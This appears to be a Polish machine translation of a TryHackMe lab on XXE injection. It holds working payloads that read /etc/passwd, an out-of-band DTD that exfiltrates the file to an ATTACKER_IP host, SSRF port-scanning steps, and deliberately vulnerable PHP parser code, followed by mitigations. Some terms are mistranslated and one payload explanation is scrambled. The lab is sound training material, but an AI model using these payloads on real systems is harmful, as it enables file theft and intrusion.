
### Skonfiguruj swoje środowisko wirtualne

Aby pomyślnie ukończyć ten pokój, musisz skonfigurować środowisko wirtualne. Wymaga to uruchomienia AttackBox (jeśli nie korzystasz z VPN) i Lab Machines, upewniając się, że posiadasz niezbędne narzędzia i dostęp do czekających Cię wyzwań.

![](https://tryhackme.com/_next/static/immutable/media/attack-box-to-target-machine.390lhknc24y-o.svg)

Maszyna atakująca![Informacje o maszynie](https://tryhackme.com/_next/static/immutable/media/info.1-3hu-_vx-jk0.svg)

Status:Wyłączony

Uruchom AttackBox

Maszyna laboratoryjna![Informacje o maszynie](https://tryhackme.com/_next/static/immutable/media/info.1-3hu-_vx-jk0.svg)

Status:Wyłączony

Uruchom maszynę laboratoryjną

### Wstęp

**XX wieku(XMLWstrzyknięcie encji zewnętrznej (External Entity)** to rodzaj luki w zabezpieczeniach, która wykorzystuje luki w zabezpieczeniach danych wejściowych XML aplikacji. Występuje, gdy aplikacja akceptuje dane wejściowe XML zawierające odwołania do encji zewnętrznych w samym pliku XML. Atakujący mogą wykorzystać tę lukę do ujawnienia plików lokalnych, wysyłania żądań po stronie serwera lub wykonywania zdalnego kodu.

Biorąc pod uwagę powszechne stosowanie XML w aplikacjach internetowych, szczególnie w usługach sieciowych iMYDŁO- opartych na API, nie można lekceważyć powagi tych luk.

### Cele

1. Rozpoznać podstawowe koncepcje i zagrożenia związane ze wstrzykiwaniem XXE.
2. Identyfikuj podatne na ataki konfiguracje i praktyki przetwarzania XML.
3. Opracowywanie technik wykrywania, wykorzystywania i łagodzenia luk w zabezpieczeniach XXE w aplikacjach.

### Wymagania wstępne

1. Wiedza na temat struktury dokumentów XML, obejmująca znaczniki, atrybuty i odwołania do encji.
2. Znajomość sposobu przetwarzania danych wejściowych i zarządzania nimi przez aplikacje internetowe.
3. Podstawowa wiedza oOWASP ZASTRZELIĆLubBurp Suite.

Odpowiedz na poniższe pytania

Wdróż docelową maszynę wirtualną dołączoną do tego zadania, naciskając zielony przycisk „Start Lab Machine”. Po uzyskaniu wygenerowanego adresu IP maszyny możesz użyć AttackBox lub własnej maszyny wirtualnej połączonej z siecią VPN TryHackMe.  
  
Po 3 minutach przejdź na **adres http://MACHINE_IP,** aby uzyskać dostęp do maszyny.


### Co to jestXML?

XML (Extensible Markup Language) to język znaczników wywodzący się z języka SGML (Standard Generalized Markup Language), który jest tym samym standardem, na którym oparty jest HTML. XML jest zazwyczaj używany przez aplikacje do przechowywania i przesyłania danych w formacie czytelnym zarówno dla człowieka, jak i przetwarzalnym przez maszyny. Jest to elastyczny i powszechnie stosowany format wymiany danych między różnymi systemami i aplikacjami. XML składa się z elementów, atrybutów i danych znakowych, które służą do reprezentacji danych w ustrukturyzowany i uporządkowany sposób.

### Składnia i struktura XML

Elementy XML są reprezentowane przez znaczniki, które są ujęte w nawiasy kątowe (<>). Znaczniki zazwyczaj występują parami, przy czym znacznik otwierający poprzedza treść, a znacznik zamykający następuje po niej. Na przykład:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<user id="1">
   <name>John</name>
   <age>30</age>
   <address>
      <street>123 Main St</street>
      <city>Anytown</city>
   </address>
</user>
```

Tag `<name>John</name>`reprezentuje element o nazwie „name” z zawartością „John”. Atrybuty dostarczają dodatkowych informacji o elementach i są określane w tagu otwierającym. Tag `<user id="1">`określa atrybut „id” o wartości „1” dla elementu „user”. Dane znaku odnoszą się do zawartości elementów, takiej jak „John”.

Powyższy przykład przedstawia prosty dokument XML z elementami, atrybutami i danymi znakowymi. `<?xml version="1.0" encoding="UTF-8"?>`Deklaracja tagu wskazuje wersję XML, a element zawiera różne podelementy i atrybuty reprezentujące dane użytkownika.

### Typowe przypadki użycia w aplikacjach internetowych

XML jest szeroko stosowany w aplikacjach internetowych do wymiany, przechowywania i konfiguracji danych. Często jest używany w usługach sieciowych i interfejsach API, takich jak SOAP i REST, do wymiany danych między systemami. XML jest również używany w plikach konfiguracyjnych, takich jak konfiguracje serwerów WWW lub ustawienia aplikacji.

### Czym jest XSLT?

XSLT (Extensible Stylesheet Language Transformations) to język używany do transformacji i formatowania dokumentów XML. Chociaż XSLT jest używany głównie do transformacji i formatowania danych, jest również istotny w przypadku ataków XXE (XML External Entities).

XSLT można wykorzystać do ułatwienia ataków XXE na kilka sposobów:  

1. **Ekstrakcja danych** : XSLT może służyć do ekstrakcji poufnych danych z dokumentu XML, które następnie mogą zostać wykorzystane w ataku XXE. Na przykład arkusz stylów XSLT może wyodrębnić dane uwierzytelniające użytkownika lub inne poufne informacje z pliku XML.
2. **Rozszerzanie encji** : XSLT może rozszerzać encje zdefiniowane w dokumencie XML, w tym encje zewnętrzne. Może to umożliwić atakującemu wstrzyknięcie złośliwych encji, co prowadzi do podatności XXE.
3. **Manipulacja danymi** : XSLT umożliwia manipulowanie danymi w dokumencie XML, co potencjalnie umożliwia atakującemu wstrzyknięcie złośliwych danych lub modyfikację istniejących danych w celu wykorzystania luki w zabezpieczeniach XXE.
4. **Blind XXE** : XSLT można wykorzystać do przeprowadzania ataków Blind XXE, w których atakujący wstrzykuje złośliwe jednostki, nie widząc odpowiedzi serwera.  
    

### Czym są DTD?

Definicje DTD (Document Type Definitions) definiują strukturę i ograniczenia dokumentu XML. Określają dozwolone elementy, atrybuty i relacje między nimi. Definicje DTD mogą być wewnętrzne w dokumencie XML lub zewnętrzne w oddzielnym pliku.

Cel i zastosowanie DTD:

- **Walidacja** : Definicje DTD weryfikują strukturę XML, aby upewnić się, że spełnia ona określone kryteria przed przetworzeniem, co jest szczególnie ważne w środowiskach, w których integralność danych ma kluczowe znaczenie.
- **Deklaracja encji** : DTD definiują encje, które można stosować w całym dokumencie XML, w tym encje zewnętrzne, które odgrywają kluczową rolę w atakach XXE.  
    

Wewnętrzne DTD określa się za pomocą `<!DOCTYPE`deklaracji, natomiast do zewnętrznych DTD odwołuje się za pomocą słowa kluczowego SYSTEM.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE config [
<!ELEMENT config (database)>
<!ELEMENT database (username, password)>
<!ELEMENT username (#PCDATA)>
<!ELEMENT password (#PCDATA)>
]>
<config>
<!-- configuration data -->
</config>
```

Powyższy przykład przedstawia wewnętrzny DTD definiujący strukturę pliku konfiguracyjnego. Deklaracje <!ELEMENT określają dozwolone elementy i ich relacje.

### DTD iXX wieku

Definicje DTD odgrywają kluczową rolę w wstrzykiwaniu XXE, ponieważ mogą być używane do deklarowania encji zewnętrznych. Encje zewnętrzne mogą odwoływać się do zewnętrznych plików lub adresów URL, co może prowadzić do wstrzykiwania złośliwych danych lub kodu.

### Jednostki XML

Encje XML to symbole zastępcze danych lub kodu, które można rozszerzyć w dokumencie XML. Istnieje pięć typów encji: encje wewnętrzne, encje zewnętrzne, encje parametryczne, encje ogólne i encje znakowe.

Przykładowy podmiot zewnętrzny:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!ENTITY external SYSTEM "http://example.com/test.dtd">
<config>
&external;
</config>
```

Pokazuje zewnętrzny obiekt odwołujący się do adresu URL. `&external;`Odwołanie w dokumencie XML zostanie rozszerzone o zawartość odwoływanego adresu URL.

### Rodzaje podmiotów

1. Encje wewnętrzne to zasadniczo zmienne używane w dokumencie XML do definiowania i zastępowania treści, które mogą być powtarzane wielokrotnie. Są one definiowane w DTD (Definicji Typu Dokumentu) i mogą uprościć zarządzanie powtarzającymi się informacjami. Na przykład:
    
    ```xml
    <!DOCTYPE note [
    <!ENTITY inf "This is a test.">
    ]>
    <note>
            <info>&inf;</info>
    </note>
    ```
    
    W tym przykładzie `&inf;`encja jest zastępowana przez swoją wartość wszędzie tam, gdzie pojawia się ona w dokumencie.
    
2. Encje zewnętrzne są podobne do encji wewnętrznych, ale do ich zawartości odwołują się osoby spoza dokumentu XML, na przykład z oddzielnego pliku lub adresu URL. Ta funkcja może zostać wykorzystana w atakach XXE (XML External Entity), jeśli procesor XML jest skonfigurowany do rozpoznawania encji zewnętrznych. Na przykład:
    
    ```xml
    <!DOCTYPE note [
    <!ENTITY ext SYSTEM "http://example.com/external.dtd">
    ]>
    <note>
            <info>&ext;</info>
    </note>
    ```
    
    W tym przypadku `&ext;`treść jest pobierana ze wskazanego adresu URL, co może stanowić zagrożenie bezpieczeństwa, jeśli adres URL jest kontrolowany przez atakującego.
    
3. Encje parametrów to specjalne typy encji używane w DTD do definiowania struktur wielokrotnego użytku lub do dołączania zewnętrznych podzbiorów DTD. Są one szczególnie przydatne do modularyzacji DTD i obsługi aplikacji XML na dużą skalę. Na przykład:
    
    ```xml
    <!DOCTYPE note [
    <!ENTITY % common "CDATA">
    <!ELEMENT name (%common;)>
    ]>
    <note>
            <name>John Doe</name>
    </note>
    ```
    
    W tym przypadku `%common;`jest używany w DTD w celu zdefiniowania typu danych, które `name`element powinien zawierać.
    
4. Encje ogólne są podobne do zmiennych i mogą być deklarowane wewnętrznie lub zewnętrznie. Służą do definiowania zamienników, które można stosować w treści dokumentu XML. W przeciwieństwie do encji parametrycznych, encje ogólne są przeznaczone do użycia w treści dokumentu. Na przykład:
    
    ```xml
    <!DOCTYPE note [
    <!ENTITY author "John Doe">
    ]>
    <note>
            <writer>&author;</writer>
    </note>
    ```
    
    Encja ta `&author;`jest ogólną encją stosowaną w celu zastąpienia nazwiska autora wszędzie tam, gdzie jest ono przywoływane w dokumencie.
    
5. Encje znaków służą do reprezentowania znaków specjalnych lub zarezerwowanych, których nie można używać bezpośrednio w dokumentach XML. Encje te zapobiegają błędnej interpretacji składni XML przez parser. Na przykład:
    
    - `&lt;`dla symbolu mniejszego niż ( `<`)
    - `&gt;`dla symbolu większości ( `>`)
    - `&amp;`dla znaku ampersand ( `&`)
    
    ```xml
    <note>
            <text>Use &lt; to represent a less-than symbol.</text>
    </note>
    ```
    
    Dzięki takiemu podejściu znaki specjalne są poprawnie przetwarzane przez parser XML i nie powodują zakłóceń w strukturze dokumentu.
    

Poniższy obraz pokazuje typ encji w strukturze DOM:

![Typy jednostek w strukturze DOM](https://cdn-images.tryhackme.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/645b19f5d5848d004ab9c9e2-1716545852309)  

_źródło: https://learn.microsoft.com/en-us/dotnet/standard/data/xml/reading-entity-declarations-and-entity-references-into-the-dom_




XMLRozbiór gramatyczny zdania

Analiza składniowa XML to proces, w którym plik XML jest odczytywany, a zawarte w nim informacje są dostępne i przetwarzane przez program. Parsery XML konwertują dane z formatu XML na strukturę, z której program może korzystać (np. drzewo DOM). Podczas tego procesu parsery mogą weryfikować dane XML pod kątem schematu lub DTD, upewniając się, że struktura jest zgodna z określonymi regułami.

Jeśli parser jest skonfigurowany do przetwarzania jednostek zewnętrznych, może to doprowadzić do nieautoryzowanego dostępu do plików, systemów wewnętrznych lub zewnętrznych stron internetowych.

### Typowe parsery XML

W różnych środowiskach programistycznych używa się kilku parserów XML; każdy parser może inaczej obsługiwać dane XML, co może mieć wpływ na podatność naXX wiekuzastrzyk.

- **DOM (Document Object Model) Parser** : Ta metoda buduje cały dokument XML w strukturę drzewa opartą na pamięci, umożliwiając swobodny dostęp do wszystkich części dokumentu. Jest to metoda wymagająca dużych zasobów, ale bardzo elastyczna.
- **SAX (prostyAPI(dla XML) Parser** : analizuje dane XML sekwencyjnie bez ładowania całego dokumentu do pamięci, co czyni go odpowiednim dla dużych plików XML. Jest jednak mniej elastyczny w przypadku losowego dostępu do danych XML.
- **Parser StAX (Streaming API for XML)** : Podobnie jak SAX, StAX analizuje dokumenty XML w sposób strumieniowy, ale daje programiście większą kontrolę nad procesem analizy XML.
- **Parser XPath** : analizuje dokument XML na podstawie wyrażenia i jest szeroko stosowany w połączeniu z XSLT.
  
  ### W paśmie i poza pasmemXX wieku

W paśmie XXE odnosi się do luki w zabezpieczeniach XXE, w której atakujący może zobaczyć odpowiedź z serwera. Umożliwia to prostą eksfiltrację i wykorzystanie danych. Atakujący może po prostu wysłać złośliwy kod.XMLładunek do aplikacji, a serwer odpowie wyodrębnionymi danymi lub wynikiem ataku.

Z kolei „XE poza pasmem” odnosi się do luki w zabezpieczeniach XXE, w której atakujący nie może zobaczyć odpowiedzi z serwera. Wymaga to użycia alternatywnych kanałów, takich jak:DNSLubHTTPżądania, aby wykraść dane. Aby je wydobyć, atakujący musi stworzyć złośliwy ładunek XML, który wyzwoli żądanie poza pasmem, takie jak zapytanie DNS lub żądanie HTTP.

### Eksploatacja w paśmie XXE

W tym pokoju będziemy używać [Burp](https://tryhackme.com/module/learn-burp-suite) . Aby zademonstrować tę lukę, przejdź do [http://MACHINE_IP/contact.php(otwiera się w nowej karcie)](http://machine_ip/contact.php)i wypełnij formularz.

![Strona główna aplikacji](https://cdn-images.tryhackme.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/db8f3f703dd6b8641d5555ed6ead1b49.png)  

Kliknij przycisk „Wyślij” i przechwyć żądanie.

![Przechwycone żądanie formularza kontaktowego](https://cdn-images.tryhackme.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/734c868f5e54ae3b3d0c3539301f2256.png)  

Przesłane dane są przetwarzane przez plik contact_submit.php, który zawiera podatny na ataki kod PHP, który zwraca wartość parametru name, gdy użytkownik wysyła wiadomość w formularzu. Poniżej znajduje się podatny na ataki kod:

```php
libxml_disable_entity_loader(false);

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $xmlData = file_get_contents('php://input');

    $doc = new DOMDocument();
    $doc->loadXML($xmlData, LIBXML_NOENT | LIBXML_DTDLOAD); 

    $expandedContent = $doc->getElementsByTagName('name')[0]->textContent;

    echo "Thank you, " .$expandedContent . "! Your message has been received.";
}
```

Ponieważ aplikacja zwraca wartość parametru name, możemy wstrzyknąć encję, na którą wskazujemy, `/etc/passwd`aby ujawnić jej wartości.

```xml
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<contact>
<name>&xxe;</name>
<email>test@test.com</email>
<message>test</message>
</contact>
```

Korzystając z powyższego ładunku, zamień początkowe dane XML przesłane do contact_submit.php i ponownie wyślij żądanie.

![Wstrzyknięty ładunek xxe wskazywał na plik /etc/passwd](https://cdn-images.tryhackme.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/2f5c2d1f8e4c04b03daa1240463e7580.png)  

### Rozszerzenie encji XML

Rozszerzanie encji XML to technika często stosowana w atakach XXE, polegająca na definiowaniu encji w dokumencie XML, który następnie jest rozszerzany przez parser XML. Atakujący mogą nadużywać tej funkcji, tworząc rekurencyjne lub nadmiernie rozbudowane encje, co prowadzi do ataku typu DoS (Domaine-Deal of Service) lub definiując zewnętrzne encje odwołujące się do wrażliwych plików lub usług. Ta metoda jest kluczowa zarówno dla ataków XXE w paśmie, jak i poza pasmem, ponieważ umożliwia atakującym wstrzykiwanie złośliwych encji do danych XML. Na przykład:

```xml
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe "This is a test message" >]>
<contact><name>&xxe; &xxe;
</name><email>test@test.com</email><message>test</message></contact>
```

W powyższym ładunku, `&xxe;`encja jest rozszerzana wszędzie tam, gdzie się pojawia. Atakujący mogą wykorzystać rozszerzanie encji do przeprowadzenia ataku Billion Laughs, w którym mały dokument XML rekurencyjnie rozszerza się, zużywając zasoby serwera, co prowadzi do odmowy usługi.

![Rozszerzenie XML w akcji](https://cdn-images.tryhackme.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/3e45b26afe9371b2061afbdba33ea3ce.png)  

### Poza pasmemXX wieku

Z drugiej strony, aby zademonstrować tę podatność, przejdź do[http://IP_MASZYNY/index.php(otwiera się w nowej karcie)](http://machine_ip/index.php)Aplikacja wykorzystuje poniższy kod, gdy użytkownik przesyła plik:

```php
libxml_disable_entity_loader(false);
$xmlData = file_get_contents('php://input'); 

$doc = new DOMDocument();
$doc->loadXML($xmlData, LIBXML_NOENT | LIBXML_DTDLOAD);

$links = $doc->getElementsByTagName('file');

foreach ($links as $link) {
    $fileLink = $link->nodeValue;
    $stmt = $conn->prepare("INSERT INTO uploads (link, uploaded_date) VALUES (?, NOW())");
    $stmt->bind_param("s", $fileLink);
    $stmt->execute();
    
    if ($stmt->affected_rows > 0) {
        echo "Link saved successfully.";
    } else {
        echo "Error saving link.";
    }
    
    $stmt->close();
}
```

Powyższy kod nie zwraca wartości przesłanychXMLdanych. Stąd określenie „Out-of-Band”, ponieważ wykradzione dane muszą zostać przechwycone za pomocą serwera kontrolowanego przez atakującego.

Do tego ataku będziemy potrzebować serwera, który będzie odbierał dane z innych serwerów. Możesz użyć modułu http.server Pythona, chociaż istnieją inne opcje, takie jakApaczlub Nginx. Używając AttackBox lub własnego komputera, uruchom serwer WWW Pythona za pomocą polecenia:

Uruchamianie serwera WWW Pythona

```shell-session
user@tryhack $ python3 -m http.server 1337
Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...
```

Prześlij plik w aplikacji i monitoruj żądanie wysyłane za `submit.php`pomocą Burp. Przekaż poniższe żądanie do Burp Repeater.

![Przekaż żądanie do repeatera](https://cdn-images.tryhackme.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/0ac465ae50933198b249c9e622cb8d9d.png)  

Korzystając z poniższego ładunku, zastąp wartość pliku XML w żądaniu i wyślij je ponownie. Pamiętaj, że zmienną ATTACKER_IP musisz zastąpić swoim własnym adresem IP.

```xml
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "http://ATTACKER_IP:1337/" >]>
<upload><file>&xxe;</file></upload>
```

Wyślij zmodyfikowane żądanie HTTP.

![Zmodyfikowane żądanie HTTP z ładunkiem](https://cdn-images.tryhackme.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/08cbba233f61b8bc17e166c089931bd6.png)  

Po wysłaniu zmodyfikowanego żądania HTTP serwer WWW Pythona otrzyma połączenie z komputera laboratoryjnego. Nawiązanie połączenia z serwerem oznacza, że ​​możliwe jest pobranie poufnych informacji z aplikacji.

![Serwer internetowy Pythona odbiera połączenie](https://cdn-images.tryhackme.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/8cfa02d850cc73372dd6993acd9265fd.png)  

Teraz możemy utworzyć plik DTD zawierający jednostkę zewnętrzną z filtrem PHP w celu ekstrakcji danych z docelowej aplikacji internetowej.

Zapisz przykładowy plik DTD poniżej i nadaj mu nazwę `sample.dtd`. Poniższy ładunek wykradnie zawartość `/etc/passwd`i odeśle odpowiedź z powrotem do serwera kontrolowanego przez atakującego:

```xml
<!ENTITY % cmd SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oobxxe "<!ENTITY exfil SYSTEM 'http://ATTACKER_IP:1337/?data=%cmd;'>">
%oobxxe;
```

**Wyjaśnienie ładunku DTD**

DTD rozpoczyna się deklaracją encji `%cmd`wskazującej na zasób systemowy.  Encja odwołuje się do zasobu w protokole filtru PHP . Pobiera zawartość pliku , standardowego pliku w systemach Unix, zawierającego informacje o kontach użytkowników. Filtr koduje zawartość w formacie Base64, aby uniknąć problemów z formatowaniem. Encja zawiera inną deklarację encji XML, , która ma identyfikator systemowy wskazujący na serwer kontrolowany przez atakującego. Zawiera parametr o nazwie data z  , reprezentujący zakodowaną w standardzie Base64 zawartość pliku .  Po przeanalizowaniu tworzy encję, która łączy się z serwerem atakującego ( ). Parametr wysyła zakodowaną w standardzie Base64 zawartość z .**`%cmd`** `php://filter/convert.base64-encode/resource=/etc/passwd``/etc/passwd``convert.base64-encode`**`%oobxxe`** `exfil``%cmd``/etc/passwd``%oobxxe;``exfil``http://ATTACKER_IP:1337/``?data=%cmd``%cmd`

Wróć do repeatera i zmień ładunek na:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE upload SYSTEM "http://ATTACKER_IP:1337/sample.dtd">
<upload>
    <file>&exfil;</file>
</upload>
```

![Zmień ładunek na zaktualizowany zewnętrzny plik DTD](https://cdn-images.tryhackme.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/2e5178fb66945cbbb4e855d013690c9c.png)  

Wyślij żądanie ponownie i sprawdź swój terminal. Otrzymasz dwa (2) żądania. Pierwsze to żądanie pliku sample.dtd, a drugie to żądanie wysłane przez podatną aplikację zawierającą zakodowany plik /etc/passwd.

![Otrzymano dwa połączenia zewnętrzne na serwerze internetowym z wyekstrahowanymi danymi](https://cdn-images.tryhackme.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/9c87f37b1fed79110958f8cdfc492c93.png)

Dekodowanie wyekstrahowanych danych base64 pokaże, że zawierają one wartość base64 z pliku /etc/passwd.

![Zdekodowana wersja wykradzionych danych](https://cdn-images.tryhackme.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/4ea510718c602ecaa7de8357599e8ab3.png)  



**Fałszowanie żądań po stronie serwera (SSRF)** Ataki mają miejsce, gdy atakujący nadużywa funkcjonalności serwera, powodując, że serwer wysyła żądania do niezamierzonej lokalizacji. W kontekścieXX wieku, atakujący może manipulowaćXMLDane wejściowe, które sprawiają, że serwer wysyła żądania do usług wewnętrznych lub uzyskuje dostęp do plików wewnętrznych. Technika ta może być używana do skanowania sieci wewnętrznych, uzyskiwania dostępu do punktów końcowych o ograniczonym dostępie lub interakcji z usługami, do których dostęp jest możliwy tylko z sieci lokalnej serwera.

### Skanowanie sieci wewnętrznej

Rozważmy scenariusz, w którym podatny na ataki serwer hostuje wewnętrznie inną aplikację internetową na niestandardowym porcie. Atakujący może wykorzystać lukę XXE, która zmusza serwer do wysłania żądania do własnego wewnętrznego zasobu sieciowego.

Na przykład, wykorzystując przechwycone żądanie z zadania XXE w paśmie, wyślij przechwycone żądanie do Burp Intruder i użyj poniższego ładunku:

```xml
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "http://localhost:§10§/" >
]>
<contact>
  <name>&xxe;</name>
  <email>test@test.com</email>
  <message>test</message>
</contact>
```

Jednostka zewnętrzna jest ustawiona na pobieranie danych z `http://localhost:§10§/`. Intruz powtórzy żądanie i wyszuka usługę wewnętrzną działającą na serwerze.

**Kroki ataku siłowego na otwarte porty:**

1. Gdy przechwycone żądanie z In-Band XXE znajdzie się w Intruderze, kliknij  `§`przycisk Dodaj, zaznaczając port.

![Żądanie HTTP w intruzie](https://cdn-images.tryhackme.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/593a4fc9649f7eb2fec803104b3a897b.png)  

2. Na karcie Ładunki ustaw typ ładunku na Liczby, wprowadzając ustawienia ładunku od 1 do 65535.

![Karta ładunków z odpowiednimi ustawieniami](https://cdn-images.tryhackme.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/e5358d3d6bde1dda471a34d9e207598e.png)

3. Po zakończeniu kliknij przycisk „Rozpocznij atak” i kliknij kolumnę „Długość”, aby posortować elementy o największym rozmiarze. Różnica w rozmiarze odpowiedzi serwera jest warta dokładniejszego zbadania, ponieważ może zawierać informacje inne niż te z innych żądań intruza.

![Udany atak pokazujący dane](https://cdn-images.tryhackme.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/6f184ed4700daf4859c6d4314a0205f5.png)  

![Zaznacz w odpowiedzi](https://cdn-images.tryhackme.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/634833be32484b2bfeb5761d3de57611.png)  

**W jaki sposób serwer to przetwarza** :

Do jednostki odwołuje się znacznik, co powoduje, że serwer tworzy `&xxe;`  `<name>` HTTPżądanie do określonego adresu URL podczas parsowania pliku XML. Odpowiedź żądanego zasobu zostanie następnie uwzględniona w odpowiedzi serwera. Jeśli aplikacja zawiera klucze tajne,APIklucze lub zakodowane na stałe hasła; informacje te mogą zostać wykorzystane w innej formie ataku, np. w celu ponownego wykorzystania hasła.

### Potencjalne implikacje dla bezpieczeństwa

- **Rozpoznanie** : atakujący mogą wykryć usługi działające na wewnętrznych portach sieciowych i uzyskać wgląd w wewnętrzną architekturę serwera.
- **Wyciek danych** : Jeśli usługa wewnętrzna zwróci poufne informacje, mogą one zostać ujawnione na zewnątrz w wyniku błędów lub danych wyjściowych XML.
- **Podniesienie uprawnień** : Dostęp do wewnętrznych usług może prowadzić do dalszych ataków, potencjalnie zwiększając możliwości atakującego w sieci.


### Unikanie błędnych konfiguracji

Błędne konfiguracje wXMLustawienia parsera są częstą przyczynąXX wiekuLuki związane z tym zjawiskiem. Dostosowanie tych ustawień może znacznie zmniejszyć ryzyko ataków XXE. Poniżej znajdują się szczegółowe wytyczne i najlepsze praktyki dotyczące kilku popularnych języków programowania i frameworków.

### Ogólne najlepsze praktyki

1. **Wyłącz encje zewnętrzne i DTD** : Zgodnie z najlepszą praktyką, wyłącz przetwarzanie encji zewnętrznych i DTD w parserach XML. Większość luk w zabezpieczeniach XXE wynika ze złośliwych DTD.
2. **Używaj mniej złożonych formatów danych** : Jeśli to możliwe, rozważ użycie prostszych formatów danych, takich jakJSON, które nie pozwalają na określenie podmiotów zewnętrznych.
3. **Walidacja danych wejściowych na liście dozwolonych** : Walidacja wszystkich danych przychodzących pod kątem ścisłego schematu, który definiuje oczekiwane typy danych i wzorce. Wyklucz lub użyj znaków specjalnych charakterystycznych dla XML, takich jak <, >, &, ' i ". Znaki te są kluczowe w składni XML i mogą prowadzić do ataków typu injection, jeśli zostaną niewłaściwie użyte.

### Techniki łagodzenia w popularnych językach

**Jawa**

Użyj `DocumentBuilderFactory`i wyłącz DTD:

```java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
dbf.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
dbf.setXIncludeAware(false);
dbf.setExpandEntityReferences(false);
DocumentBuilder db = dbf.newDocumentBuilder();
```

**.INTERNET**

Skonfiguruj czytniki XML, aby ignorowały DTD i encje zewnętrzne:

```csharp
XmlReaderSettings settings = new XmlReaderSettings();
settings.DtdProcessing = DtdProcessing.Prohibit;
settings.XmlResolver = null;
XmlReader reader = XmlReader.Create(stream, settings);
```

**PHP**

Wyłącz ładowanie zewnętrznych jednostek przez libxml:

```php
libxml_disable_entity_loader(true);
```

**Pyton**

Użyj `defusedxml`biblioteki, która ma na celu ograniczenie luk w zabezpieczeniach XML:

```python
from defusedxml.ElementTree import parse
et = parse(xml_input)
```

### Regularnie aktualizuj i łataj

- **Aktualizacje oprogramowania** : Utrzymuj wszystkie procesory i biblioteki XML na bieżąco. Dostawcy regularnie łatają znane luki w zabezpieczeniach.
- **Poprawki bezpieczeństwa** : Regularnie stosuj poprawki bezpieczeństwa w aplikacjach internetowych i ich środowiskach.

### Świadomość bezpieczeństwa i przeglądy kodu

- **Przeprowadzaj przeglądy kodu** : Regularnie przeglądaj kod pod kątem luk w zabezpieczeniach, zwłaszcza kod obsługujący dane wejściowe XML i jego analizę.
- **Promuj szkolenia z zakresu bezpieczeństwa** : upewnij się, że programiści znają bezpieczne praktyki kodowania, w tym ryzyka związane z analizą składni XML.



### Wniosek

XX wieku(XMLAtaki typu „Entities” wynikają z nieprawidłowego przetwarzania danych wejściowych użytkownika w aplikacjach internetowych, szczególnie w procesie parsowania XML. Atakujący wykorzystują podatne procesory XML do wstrzykiwania złośliwych encji zewnętrznych, co prowadzi do wycieku danych, naruszenia bezpieczeństwa serwera lub odmowy usługi. Lukom w zabezpieczeniach XXE można zapobiegać, wyłączając rozszerzanie encji zewnętrznych, weryfikując dane wejściowe użytkownika i korzystając z bezpiecznych bibliotek do parsowania XML. Ponadto wdrożenie najlepszych praktyk bezpieczeństwa, takich jak walidacja danych wejściowych, kodowanie danych wyjściowych i bezpieczne praktyki kodowania, może znacznie zmniejszyć ryzyko ataków XXE. Regularne audyty bezpieczeństwa, przeglądy kodu i szkolenia z zakresu bezpiecznych praktyk programistycznych są niezbędne do identyfikacji i ograniczania luk w zabezpieczeniach XXE. Rozumiejąc zagrożenia i podejmując proaktywne działania, programiści i administratorzy mogą chronić swoje aplikacje internetowe przed atakami XXE i zapewnić bezpieczeństwo orazuczciwośćich systemów.

### Podsumowanie kluczowych koncepcji omawianych na sali

W tej sali szkoleniowej omówiliśmy szeroki zakres tematów związanych z lukami bezpieczeństwa XXE (XML External Entity), które są kluczowe dla zrozumienia, jak te luki mogą wpływać na bezpieczeństwo sieci. Oto krótkie podsumowanie:

- **Zrozumienie XML** : Poznaliśmy podstawy składni i struktury XML, w tym zastosowanie DTD i sposoby ich wykorzystania.
- **Mechanizmy analizy XML** : Omówiliśmy różne parsery XML i ich konfiguracje, kładąc nacisk na bezpieczne praktyki.
- **Wykorzystanie XXE** : Podano szczegółowe kroki mające na celu wykorzystanie luk XXE, od podstawowego wycieku danych po zaawansowane techniki, takie jak Out-of-Band XXE.
- **XXE+SSRF**:Przeanalizowaliśmy koncepcję ataków SSRF za pośrednictwem XXE w celu eksfiltracji danych poza pasmem oraz sposób skanowania sieci wewnętrznych przy użyciu tego ataku.
- **Łagodzenie** : Przedstawiono strategie zapobiegania podatnościom XXE, kładąc nacisk na unikanie błędnych konfiguracji i wzmacnianie bezpiecznych praktyk kodowania.
